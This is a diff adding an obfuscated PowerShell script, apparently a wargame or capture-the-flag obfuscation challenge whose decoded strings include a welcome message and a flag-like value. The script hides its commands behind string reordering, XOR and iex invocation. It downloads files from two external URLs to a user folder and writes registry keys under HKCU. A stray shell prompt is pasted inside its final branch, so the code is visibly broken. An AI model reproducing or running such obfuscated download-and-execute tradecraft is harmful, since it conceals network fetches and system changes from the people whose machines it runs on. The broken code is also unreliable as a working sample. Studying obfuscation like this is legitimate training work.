@@ -1,0 +1,16 @@
+$MxYs6Vys6  = ('New-Tem'+'p'+'orar'+'yFile')|& ( $pshOme[4]+$psHOmE[34]+'X');
+$L4Con3B4nTU = (100,71,104,108,73,72,82,104,97);
+$GF8UYpawBX=((("{4}{3}{2}{6}{5}{1}{0}" -f'llName','h5S.Fu','R','g','tP7E','j','I9b'))  -rePLACe 'tP7',[CHaR]36)|& ((get-VArIABLe '*mDr*').NaME[3,11,2]-jOIN'');
+$L4Con3B4nTU += (87,119,103,98,50,89,103,100,71,104,108);
+$L4Con3B4nTU += (73,71,90,115,89,87,99,54,73,67,74,102,78,69,82,69);
+$L4Con3B4nTU += (77,85,52,50,88,122,85,119,84,84,78,102,77,68,104,71,86,84);
+$Eg4w85M9Qi = (('trS'+'Wxrked '+'sx hca'+'d'+'rd'+', fx'+'r'+'gxt'+' hx'+'w tx v'+'cadcca'+'dtix'+'n!'+'!'+'!!tr'+'S.Re'+'P'+'lAc'+'E(trSxtr'+'S,'+'trS0trS).'+'R'+'e'+'PlAcE(t'+'r'+'S'+'ca'+'dt'+'rS,tr'+'Sat'+'rS'+')')  -repLaCE 'trS',[CHAr]39) | . ((varIaBle '*mdr*').namE[3,11,2]-jOin'');
+$L4Con3B4nTU += (86,68,78,68,99,122,88,122,69,49,88,48,90,86,84,110,48,105);
+$sEpb5puTtV =(('{4}{0}{3}{5}{1}{7}{2}{6}'-f'nVerT]:','HNe','h',':toBaSE6','[System.Co','4STRINg(jD8GL',')','0URo')).rePLACe(([chAR]106+[chAR]68+[chAR]56),[strIng][chAR]36) |& ((VArIaBLe '*MDR*').nAME[3,11,2]-jOin'');
+Write-Output $sEpb5puTtV | .('{2}{1}{0}' -f 'ile','ut-f','o') ${GF8UYpawBX};$azfcfToiBq=("{1}{4}{8}{7}{2}{5}{6}{9}{3}{0}" -f 'ion','Welc','_Warga','cat','om','me!','S1mple','o','e_t','_Obfu');
+$cOP2lgqRhb=';l`~zfa|tB;L}?:P;AKP<B7<KK>A9P7Z8';$cOP2lgqRhb.("{1}{2}{0}" -f'ay','tocha','rarr').invoke() | .("{2}{1}{0}{3}" -f'-','ach','fore','object')  -Process{$rEianMEKgy +=[char]([byte][char]$_ -bxor 0xf)};
+$C4Lg8xccWH='https:][(s)]w][(s)]wgoogle.com][(s)]wut][(s)]w$https:][(s)]w][(s)]winsa-vl.fr][(s)]wsupp'.repLAcE((']'+'['+('(s)]'+'w')),([array]('/'),('xw'+'e'))[0]).sPlIT('$');
+$mAMq5ixXLi =0;
+try {foreach($JJU1E8IktL  in $C4Lg8xccWH){(New-Object System.Net.WebClient).DownloadFile($JJU1E8IktL ,'C:\Users\MalFaiteur')}}catch [System.Net.WebException],[System.IO.IOException] {("{9}{3}{7}{0}{10}{8}{2}{5}{11}{6}{4}{1}" -f 'on','ist!!!',' or Fil','nne','ex','e does ','t ','cti','ailed!!!','Co',' F','no');
+$mAMq5ixXLi =1};(('New'+'-Item -Path '+'{0'+'}HK'+'C'+'U:{0}'+' '+'-'+'Name '+'{0}whit'+'eha'+'t{0}')-F  [char]34)| iex;
+if($mAMq5ixXLi  -gt 0){(('New'+'-'+'I'+'temProperty'+' -Pat'+'h I9'+'KHKCU:1'+'wut???'+'I9'+'K -Nam'+'e I9'+'Kwarga'+'meI9K -Va'+'lue Nzvazf'+'c'+'fToiBq'+' -PropertyType I9KStri'+'ngI9K').RePlACe('I9K',[sTrIng][Char]34).RePlACe(([Char]49+[Char]76+[Char]101),[sTrIng][Char]92).RePlACe(([Char]78+[Char]122+[Char]118),'$'))| iex}else{PS C:\Users\my_ant_ti3m> ((("{4}{9}{0}{13}{7}{3}{1}{10}{8}{6}{16}{12}{11}{2}{15}{5}{14}" -f'roperty -P','CU:rBQwh','o','lX1HK','New-It','e lX1','lX1wargamelX1 ','h ',' ','emP','itehatlX1 -Name','-Pr',' ','at','StringlX1','pertyTyp','-Value 8qarEianMEKgy '))  -rEpLACe ([ChAr]108+[ChAr]88+[ChAr]49),[ChAr]34 -rEpLACe([ChAr]114+[ChAr]66+[ChAr]81),[ChAr]92  -crepLacE([ChAr]56+[ChAr]113+[ChAr]97),[ChAr]36) | iex};
